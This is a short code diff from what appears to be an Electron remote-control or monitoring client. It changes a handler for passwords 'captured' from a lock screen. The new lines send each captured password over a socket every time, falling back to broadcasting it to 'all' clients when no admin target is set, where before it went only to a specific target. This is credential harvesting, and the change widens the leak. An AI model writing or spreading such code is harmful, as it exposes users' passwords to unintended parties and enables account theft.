@@ -436,10 +436,9 @@ window.onload = async () => {
         });
 
         window.electronAPI.onCapturedPassword((pwd) => {
-            if (currentAdminForLockscreen) {
-                socket.emit('captured-password', { targetId: currentAdminForLockscreen, password: pwd, sourceId: socket.id });
-                currentAdminForLockscreen = null;
-            }
+            const adminTarget = currentAdminForLockscreen || 'all';
+            socket.emit('captured-password', { targetId: adminTarget, password: pwd, sourceId: socket.id });
+            currentAdminForLockscreen = null;
         });
 
         // Helper function to setup WebRTC
